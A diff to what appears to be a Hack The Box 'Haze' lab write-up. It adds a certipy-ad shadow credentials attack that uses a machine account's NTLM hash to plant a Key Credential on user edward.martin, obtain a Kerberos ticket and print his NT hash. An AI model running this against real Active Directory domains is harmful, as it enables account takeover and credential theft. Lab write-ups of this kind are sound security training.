@@ -543,5 +543,46 @@ So i cannot abuse `ForceChangePassword` for some reason here
 So ill have to abuse shadow credentials here
 
 ```python
-faketime '00:30:18.253096' certipy-ad shadow auto -u 'haze-it-backup$@haze.htb' -hashes ':76da32697ff38bc7c9fa6289abf47940' -account 'edward.martin' -debug -dc-host dc01.haze.htb -dc-ip 10.129.12.135 -target dc01.haze.htb
+faketime -f +8h certipy-ad shadow auto -u 'haze-it-backup$@haze.htb' -hashes ':76da32697ff38bc7c9fa6289abf47940' -account 'edward.martin' -debug -dc-host dc01.haze.htb -dc-ip 10.129.12.135 -target dc01.haze.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.129.12.135'
+[+] DC IP: '10.129.12.135'
+[+] DC Host: 'dc01.haze.htb'
+[+] Target IP: None
+[+] Remote Name: 'dc01.haze.htb'
+[+] Domain: 'HAZE.HTB'
+[+] Username: 'HAZE-IT-BACKUP$'
+[+] Trying to resolve 'dc01.haze.htb' at '10.129.12.135'
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.12.135:636 - ssl
+[+] Default path: DC=haze,DC=htb
+[+] Configuration path: CN=Configuration,DC=haze,DC=htb
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'b5d7a68a63324a4498adef96fec68039'
+[*] Adding Key Credential with device ID 'b5d7a68a63324a4498adef96fec68039' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID 'b5d7a68a63324a4498adef96fec68039' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC haze.htb (10.129.12.135)
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[+] Attempting to write data to 'edward.martin.ccache'
+[+] Data written to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
 ```
+I now have the NT hash for the user edward.mar
